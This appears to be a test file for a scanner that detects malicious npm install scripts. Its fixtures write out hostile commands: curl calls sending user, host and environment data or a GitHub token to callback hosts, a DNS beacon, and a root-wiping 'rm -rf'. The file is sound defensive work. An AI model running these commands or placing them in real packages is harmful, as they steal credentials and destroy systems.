import assert from 'node:assert/strict';
import { test } from 'node:test';
import { DEFAULT_THRESHOLDS, EXECUTED_AT, LOCKFILE_RULE_WEIGHTS } from '../src/config/constants.js';
import { analyseLifecycleCommands, hasLifecycleScript, installScriptFiles } from '../src/static/lifecycle-scripts.js';
import { PURPOSE } from '../src/static/purpose.js';
import { scorePackage } from '../src/static/scoring.js';
import { verdictFor } from '../src/score/aggregate.js';

const manifestWith = (scripts) => ({ name: 'fixture', version: '1.0.0', scripts });
const capabilitiesOf = (findings) => findings.map((finding) => finding.capability);
const lifecycleLockfileFinding = {
  rule: 'lockfile.lifecycle-script',
  weight: LOCKFILE_RULE_WEIGHTS['lockfile.lifecycle-script'],
  detail: 'declares a lifecycle script',
};

test('a curl beacon with command substitution in preinstall fails as install-time execution', () => {
  const findings = analyseLifecycleCommands(manifestWith({
    preinstall: 'curl "http://example-prod.abcdefghijklmnopqrstuvwxyz012345.oast.fun/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"',
  }));
  const found = capabilitiesOf(findings);
  assert.ok(found.includes('script.shell-download'));
  assert.ok(found.includes('script.host-exfil'));
  assert.ok(findings.some((finding) => finding.capability === 'indicator.c2' && finding.indicator === 'interactsh-oast'));
  assert.ok(findings.every((finding) => finding.scope === 'module' && finding.executedAt === EXECUTED_AT.INSTALL && finding.file === 'package.json'));

  const { score, patterns } = scorePackage(findings, [lifecycleLockfileFinding], PURPOSE.UNKNOWN, { filesScanned: 0 });
  assert.equal(verdictFor(score, DEFAULT_THRESHOLDS), 'fail');
  assert.ok(patterns.includes('install-time-execution'));
  assert.ok(!patterns.includes('import-time-execution'));
});

test('credential theft and a wiper in the command string are both named', () => {
  const findings = analyseLifecycleCommands(manifestWith({
    preinstall: 'curl -d "$(gh auth token)" https://webhook.site/00000000-0000-0000-0000-000000000000; sudo rm -rf --no-preserve-root /',
    postinstall: 'rm /s /q',
  }));
  const found = capabilitiesOf(findings);
  assert.ok(found.includes('script.host-exfil'));
  assert.ok(found.includes('script.destructive'));
  assert.ok(findings.some((finding) => finding.indicator === 'request-catcher'));
  assert.ok(findings.some((finding) => finding.enclosing === 'scripts.postinstall' && finding.capability === 'script.destructive'));
});

test('inline node -e code is parsed like a module-scope source file', () => {
  const findings = analyseLifecycleCommands(manifestWith({
    preinstall: `node -e "const dns=require('dns');dns.lookup('abc.oastify.com',()=>{})"`,
  }));
  const found = capabilitiesOf(findings);
  assert.ok(found.includes('script.inline-code'));
  assert.ok(found.includes('dns.lookup'), `inline dns.lookup should be extracted, got ${found.join(', ')}`);
  const dns = findings.find((finding) => finding.capability === 'dns.lookup');
  assert.equal(dns.scope, 'module');
  assert.equal(dns.executedAt, EXECUTED_AT.INSTALL);
  assert.ok(found.includes('indicator.c2'));
});

test('piping the environment through base64 to a request catcher is caught', () => {
  const findings = analyseLifecycleCommands(manifestWith({
    postinstall: 'curl -s -X POST -d "$(env | base64)" https://example.free.beeceptor.com',
  }));
  const found = capabilitiesOf(findings);
  assert.ok(found.includes('script.host-exfil'));
  assert.ok(found.includes('script.encoded'));
  assert.ok(found.includes('indicator.c2'));
});

test('ordinary install commands produce no command findings', () => {
  const ordinary = [
    'node install.js',
    'node-gyp-build',
    'prebuild-install -r napi || node-gyp rebuild',
    'rm -rf ./tmp && node build.js',
    'node scripts/postinstall.js 2>/dev/null || true',
  ];
  for (const command of ordinary) {
    assert.deepEqual(analyseLifecycleCommands(manifestWith({ install: command })), [], command);
  }
  assert.deepEqual(analyseLifecycleCommands({ name: 'no-scripts' }), []);
});

test('lifecycle helpers read the manifest', () => {
  assert.equal(hasLifecycleScript(manifestWith({ postinstall: 'node x.js' })), true);
  assert.equal(hasLifecycleScript(manifestWith({ build: 'tsc' })), false);
  assert.equal(hasLifecycleScript({}), false);
  assert.deepEqual(
    [...installScriptFiles(manifestWith({ preinstall: 'node ./scripts/setup.mjs && node lib/b.cjs' }))],
    ['scripts/setup.mjs', 'lib/b.cjs'],
  );
});
